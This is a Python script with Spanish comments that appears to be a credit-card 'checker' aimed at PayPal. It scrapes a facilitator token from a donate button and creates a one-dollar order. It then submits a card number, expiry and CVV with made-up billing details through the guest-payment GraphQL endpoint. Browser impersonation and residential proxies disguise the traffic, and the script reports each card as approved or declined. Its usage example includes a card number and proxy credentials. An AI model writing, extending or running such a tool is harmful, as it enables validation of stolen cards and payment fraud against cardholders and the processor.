import asyncio
import sys # <-- NUEVA LIBRERÍA
from curl_cffi.requests import AsyncSession

class tools:
    @staticmethod
    def getcard(card: str, fm: int = 1, fy: int = 4) -> dict:
        cc, mm, yy, cvv = card.split("|")
        mm = mm.lstrip('0') or '0' if fm == 1 else mm.zfill(2)
        yy = yy[-2:] if fy == 2 else (f"20{yy}" if len(yy) == 2 else yy)
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    
    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try: return s.split(first, 1)[1].split(last, 1)[0]
        except: return None
    
    @staticmethod
    def userdata() -> dict:
        return {"first": "John", "last": "Smith", "phone": "2025550143", "email": "john.smith9988@gmail.com", "address": "123 Main St", "city": "New York", "state": "NY", "zip": "10001", "country": "US"}
    
    @staticmethod
    def get_card_type(cc_first: str) -> str:
        return {"5": "MASTER_CARD", "3": "AMEX", "6": "DISCOVER"}.get(cc_first, "VISA")

class gateway:
    @staticmethod
    async def code(card: str, prox: str = None) -> tuple:
        proxy = f"http://{prox}" if prox and "://" not in prox else prox
        ccd = tools.getcard(card, 2, 2)
        
        for intento in range(3):
            try:
                user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
                
                async with AsyncSession(impersonate="chrome120", proxy=proxy) as session:
                    user = tools.userdata()
                    card_type = tools.get_card_type(ccd['cc'][0])
                    
                    # ========== >_ Req 1: Token
                    headers = {
                        'User-Agent': user_agent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    url1 = 'https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_e775778837_mja6mzg6mty&sessionID=uid_1a87d97aea_mja6mzg6mty&buttonSessionID=uid_1e550b2bd0_mja6mzg6mty&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false'
                    
                    response = await session.get(url1, headers=headers)
                    token = tools.find_between(response.text, '"facilitatorAccessToken":"', '"')
                    if not token: 
                        print(f"[Intento {intento+1}] Fallo al obtener token.")
                        continue
                    
                    # ========== >_ Req 2: Crear Orden
                    headers = {
                        'User-Agent': user_agent,
                        'content-type': 'application/json', 
                        'authorization': f'Bearer {token}'
                    }
                    order_data = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"Test","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}]}],"intent":"CAPTURE"}'
                    response = await session.post('https://www.paypal.com/v2/checkout/orders', headers=headers, data=order_data)
                    
                    order_id = tools.find_between(response.text, '"id":"', '"')
                    if not order_id: 
                        print(f"[Intento {intento+1}] Fallo al crear orden.")
                        continue
                    
                    # ========== >_ Req 3: Enviar Tarjeta
                    headers = {
                        'User-Agent': user_agent,
                        'paypal-client-context': order_id, 
                        'x-app-name': 'standardcardfields', 
                        'content-type': 'application/json'
                    }
                    json_data = {
                        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
                        'variables': {
                            'token': order_id,
                            'card': {'cardNumber': ccd['cc'], 'type': card_type, 'expirationDate': f"{ccd['mm']}/{ccd['yy']}", 'postalCode': user['zip'], 'securityCode': ccd['cvv']},
                            'phoneNumber': user['phone'],
                            'firstName': user['first'],
                            'lastName': user['last'],
                            'billingAddress': {'givenName': user['first'], 'familyName': user['last'], 'line1': user['address'], 'line2': None, 'city': user['city'], 'state': user['state'], 'postalCode': user['zip'], 'country': user['country']},
                            'shippingAddress': {'givenName': user['first'], 'familyName': user['last'], 'line1': user['address'], 'line2': None, 'city': user['city'], 'state': user['state'], 'postalCode': user['zip'], 'country': user['country']},
                            'email': user['email'],
                            'currencyConversionType': 'PAYPAL',
                        },
                        'operationName': None,
                    }
                    response = await session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
                    
                    # ========== >_ LÓGICA DE RESPUESTA CORREGIDA ==========
                    if '"errors"' in response.text:
                        error_msg = tools.find_between(response.text, '"message":"', '"')
                        error_code = tools.find_between(response.text, '"code":"', '"')
                        
                        if not error_code:
                            error_code = tools.find_between(response.text, '"type":"', '"')
                        
                        if not error_code:
                            return "Declined!", f"Error Raw: {response.text[:80]}..."
                            
                        return "Declined!", f"{error_msg} ({error_code})"
                    
                    elif '"data":null' in response.text or '"approveGuestPaymentWithCreditCard":null' in response.text:
                        return "Declined!", "Generic Error (No Data)"
                    
                    else:
                        return "Approved!", "success"

            except Exception as e:
                print(f"Excepción en intento {intento+1}: {e}")
                continue
        
        return "Error!", "Error de conexion con la api"

# ==========================================
# AQUÍ ESTÁ EL CAMBIO PARA PASAR EL PROXY
# ==========================================
if __name__ == "__main__":
    # Verificamos si el usuario pasó una tarjeta y un proxy por la terminal
    if len(sys.argv) < 2:
        print("Uso: python script.py 'cc|mm|yy|cvv' 'http://user:pass@ip:port'")
        print("Ejemplo: python script.py '4003365978822318|08|28|123' 'http://rnpodzhtstaticresidential:df4zrj7z8jjx@82.23.103.134:7861'")
        sys.exit(1)

    # Tomamos los datos de la terminal
    tarjeta_prueba = sys.argv[1]
    
    # Si el usuario escribió un proxy, lo tomamos. Si no, lo dejamos en None (sin proxy)
    proxy_prueba = sys.argv[2] if len(sys.argv) > 2 else None 
    
    print(f"Probando tarjeta: {tarjeta_prueba}")
    print(f"Usando proxy: {proxy_prueba if proxy_prueba else 'Sin proxy (IP de tu PC)'}")
    
    resultado = asyncio.run(gateway.code(tarjeta_prueba, proxy_prueba))
    print(f"Resultado: {resultado}")
